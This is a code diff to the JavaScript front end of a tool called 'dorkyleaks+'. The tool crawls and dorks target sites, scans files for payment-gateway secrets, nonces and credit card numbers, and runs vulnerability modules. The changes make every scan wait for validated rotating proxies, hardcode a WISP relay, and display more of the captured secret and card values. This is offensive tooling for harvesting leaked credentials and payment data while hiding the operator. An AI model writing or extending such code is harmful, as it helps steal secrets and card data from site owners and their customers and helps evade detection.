+  const btn = $(btnId); if (btn) { btn.dataset.userDisabled = '1'; btn.disabled = true; btn.innerHTML = '<span class="spin"></span>running'; }
   $('pauseBtn').disabled = false; $('stopBtn').disabled = false;
 }
 function endTaskUI(btnId, label) {
   runningTask = false; setLive('ok', 'ready');
-  const btn = $(btnId); if (btn) { btn.disabled = false; btn.textContent = label; }
+  const btn = $(btnId); if (btn) { btn.dataset.userDisabled = ''; btn.disabled = false; btn.textContent = label; }
   $('pauseBtn').disabled = true; $('stopBtn').disabled = true;
   setPaused(false);
   setTimeout(() => { if (!runningTask) { $('prog').classList.remove('show'); $('fill').style.width = '0%'; } }, 3500);
   renderResults();
+  updateScanButtons();
+}
+
+function requireProxies() {
+  if (!proxyReady) {
+    toast('waiting for proxies to be validated');
+    tlog('crawlLog', '!', 'BLOCKED - no validated proxies yet', 'warn');
+    return false;
+  }
+  return true;
 }
 
 $('crawlGo').addEventListener('click', async () => {
@@ -3080,6 +3251,7 @@ $('crawlGo').addEventListener('click', async () => {
   if (!url) { toast('enter a url'); return; }
   if (runningTask) { toast('busy'); return; }
   if (!poolReady) { toast('workers not ready'); return; }
+  if (!requireProxies()) return;
   startTaskUI('crawlGo', 'crawling');
   $('crawlLog').innerHTML = ''; lineCounts.crawlLog = 0; $('crawlCnt').textContent = '0 lines';
   try {
@@ -3096,6 +3268,7 @@ $('dorkGo').addEventListener('click', async () => {
   if (!query) { toast('enter a query'); return; }
   if (runningTask) { toast('busy'); return; }
   if (!poolReady) { toast('workers not ready'); return; }
+  if (!requireProxies()) return;
   const max = Math.max(1, Math.min(5000, parseInt($('dorkMax').value, 10) || 100));
   startTaskUI('dorkGo', 'dorking');
   $('dorkLog').innerHTML = ''; lineCounts.dorkLog = 0; $('dorkCnt').textContent = '0 lines';
@@ -3155,7 +3328,7 @@ $('scanFiles').addEventListener('click', () => {
     const gws = detectGateways(f.content);
     for (const g of gws) {
       if (g.startsWith('\x00')) { const parts = g.split('\x00'); const name = parts[1], val = parts[2]; if (addFinding(name, val, f.name, 'FORMAT_VALID')) tlog('crawlLog', '@', name + ' = ' + trunc(val, 60), 'gw'); }
-      else { state.gateways.add(g); if (addFinding('Gateway: ' + g, f.name, f.name, 'FORMAT_VALID')) tlog('crawlLog', '#', 'Gateway ' + g, 'gw'); }
+      else { state.gateways.add(g); const sig = GATEWAY_SIGNATURES[g] && GATEWAY_SIGNATURES[g].re; const ev = sig ? captureEvidence(f.content, sig) : g; if (addFinding('Gateway: ' + g, ev || g, f.name, 'FORMAT_VALID')) tlog('crawlLog', '#', 'Gateway ' + g + ' :: ' + trunc(ev, 60), 'gw'); }
     }
   }
   tlog('crawlLog', '+', 'FILE SCAN done - ' + state.findings.length + ' total findings', 'hit');
@@ -3177,8 +3350,11 @@ $('pathsSave').addEventListener('click', () => { const v = $('pathsEditor').valu
 $('pathsReset').addEventListener('click', () => { localStorage.removeItem('DorkyLeaks_paths'); loadPaths(); toast('reset'); });
 
 /* Settings */
-const SETTING_KEYS = ['wispUrl', 'reqTimeout', 'concurrency', 'userAgentInput', 'extraHeaders', 'proxyListUrl'];
-function loadSettings() { SETTING_KEYS.forEach(k => { const stored = localStorage.getItem('DL_' + k); if (stored !== null) { const el = $(k); if (el) el.value = stored; } }); }
+const SETTING_KEYS = ['reqTimeout', 'concurrency', 'userAgentInput', 'extraHeaders', 'proxyListUrl'];
+function loadSettings() {
+  SETTING_KEYS.forEach(k => { const stored = localStorage.getItem('DL_' + k); if (stored !== null) { const el = $(k); if (el) el.value = stored; } });
+  const wispEl = $('wispUrl'); if (wispEl) wispEl.value = WISP_HARDCODED;
+}
 function saveSettings() { SETTING_KEYS.forEach(k => { const el = $(k); if (el) { try { localStorage.setItem('DL_' + k, el.value); } catch {} } }); }
 $('settingsSave').addEventListener('click', async () => {
   saveSettings();
@@ -3186,6 +3362,8 @@ $('settingsSave').addEventListener('click', async () => {
   if (wispClient) { try { wispClient.disconnect(); } catch {} wispClient = null; }
   poolReady = false;
   await startPool();
+  // reload proxies after pool restart (WISP might've changed)
+  await autoLoadProxies();
 });
 $('settingsReset').addEventListener('click', () => {
   SETTING_KEYS.forEach(k => {
@@ -3200,6 +3378,7 @@ $('settingsReset').addEventListener('click', () => {
   toast('reset to defaults');
 });
 $('btnLoadProxies').addEventListener('click', () => loadAndCheckProxies());
+$('retryProxyBtn').addEventListener('click', () => loadAndCheckProxies());
 
 /* Modules */
 let modulesBuilt = false;
@@ -3229,7 +3408,8 @@ function buildModuleSummary() {
       const url = (typeof item === 'string' ? item : item.url || '') || '';
       const issue = typeof item === 'object' ? (item.issue || item.technique || '') : '';
       const param = typeof item === 'object' && item.param ? 'param: ' + item.param : '';
-      html += '<div class="card"><div class="fl">X</div><div class="mid"><div class="ad">' + esc(trunc(url, 90)) + '</div>' + (issue ? '<div class="sub">' + esc(issue) + '</div>' : '') + (param ? '<div class="sub">' + esc(param) + '</div>' : '') + '</div></div>';
+      const evidence = typeof item === 'object' ? (item.evidence || '') : '';
+      html += '<div class="card"><div class="fl">X</div><div class="mid">' + (evidence ? '<div class="ad">' + esc(trunc(evidence, 100)) + '</div>' : '') + (issue ? '<div class="sub">' + esc(issue) + '</div>' : '') + '<div class="sub">' + esc(trunc(url, 100)) + '</div>' + (param ? '<div class="sub">' + esc(param) + '</div>' : '') + '</div></div>';
     }
     if (items.length > 50) html += '<div class="card"><div class="mid"><div class="ad">...and ' + (items.length - 50) + ' more</div></div></div>';
     html += '</div></div>';
@@ -3250,6 +3430,7 @@ async function runAll() {
   const raw = $('moduleTargetUrl').value.trim();
   if (!raw) { toast('enter a target URL'); return; }
   if (runningTask) { toast('busy'); return; }
+  if (!requireProxies()) return;
   buildModuleUI();
   startTaskUI('btnRunAll', 'modules');
   modFindings = {}; modCounts = {}; _testableModUrls = [];
@@ -3278,6 +3459,7 @@ async function runModule(id) {
   const raw = $('moduleTargetUrl').value.trim();
   if (!raw) { toast('enter a target URL'); return; }
   if (runningTask) { toast('busy'); return; }
+  if (!requireProxies()) return;
   buildModuleUI();
   const mod = MODULES.find(m => m.id === id);
   if (!mod) return;
@@ -3309,7 +3491,7 @@ function renderResults() {
     const vuln = isVuln(t), gw = t.startsWith('Gateway:'), nonce = t.startsWith('Nonce:');
     html += '<div class="group"><div class="gh"><h4>' + esc(t) + '</h4><span class="c">' + groups[t].length + '</span></div><div class="list">';
     for (const x of groups[t].slice(0, 200)) {
-      const disp = x.value.length > 90 ? x.value.slice(0, 45) + '...' + x.value.slice(-25) : x.value;
+      const disp = x.value.length > 120 ? x.value.slice(0, 60) + '...' + x.value.slice(-40) : x.value;
       const cls = vuln ? 'tag vuln' : gw ? 'tag gw' : nonce ? 'tag warn' : (t === 'Credit Card' ? 'tag crit' : 'tag');
       const icon = t === 'Credit Card' ? '$' : vuln ? 'X' : gw ? '#' : nonce ? 'n' : '*';
       html += '<div class="card" data-v="' + esc(x.value) + '"><div class="fl">' + icon + '</div><div class="mid"><div class="ad">' + esc(disp) + '</div>' + (x.source ? '<div class="sub">' + esc(x.source) + '</div>' : '') + '</div><div class="rt"><span class="' + cls + '">' + esc(x.status) + '</span></div></div>';
@@ -3379,17 +3561,35 @@ buildModuleUI();
 tlog('crawlLog', '.', 'dorkyleaks+ ready - awaiting target', 'dim');
 tlog('dorkLog', '.', 'dorkyleaks+ ready - awaiting query', 'dim');
 setLive('on', 'connecting');
+updateScanButtons(); // disables scans until proxies ready
+
 (async () => {
   const r = await startPool();
   if (!r.ok) {
     tlog('crawlLog', 'x', r.why, 'bad');
-    tlog('crawlLog', '!', 'append ?wisp=wss://yourserver/ to use your own relay', 'warn');
     tlog('dorkLog', 'x', r.why, 'bad');
-  } else {
-    const alive = pool.filter(w => w.ok && !w.dead).length;
-    tlog('crawlLog', '+', 'READY - ' + alive + ' workers', 'hit');
-    tlog('dorkLog', '+', 'READY - ' + alive + ' workers', 'hit');
+    setLive('bad', 'workers dead');
+    updateScanButtons();
+    return;
   }
+  const alive = pool.filter(w => w.ok && !w.dead).length;
+  tlog('crawlLog', '+', 'READY - ' + alive + ' workers, WISP hardcoded', 'hit');
+  tlog('dorkLog', '+', 'READY - ' + alive + ' workers, WISP hardcoded', 'hit');
+  tlog('crawlLog', 'o', 'auto-loading and validating proxies...', 'hdr');
+  tlog('dorkLog', 'o', 'auto-loading and validating proxies...', 'hdr');
+  setLive('on', 'loading proxies');
+  await autoLoadProxies();
+  const working = proxyList.filter(p => p.alive).length;
+  if (working > 0) {
+    setLive('ok', 'ready (' + working + ' proxies)');
+    tlog('crawlLog', '+', 'PROXIES READY - ' + working + ' alive, rotation enabled', 'hit');
+    tlog('dorkLog', '+', 'PROXIES READY - ' + working + ' alive, rotation enabled', 'hit');
+  } else {
+    setLive('bad', 'no proxies');
+    tlog('crawlLog', '!', 'NO WORKING PROXIES - scans blocked. Click Reload Proxies.', 'warn');
+    tlog('dorkLog', '!', 'NO WORKING PROXIES - scans blocked. Click Reload Proxies.', 'warn');
+  }
+  updateScanButtons();
 })();
 </script>
 </body>
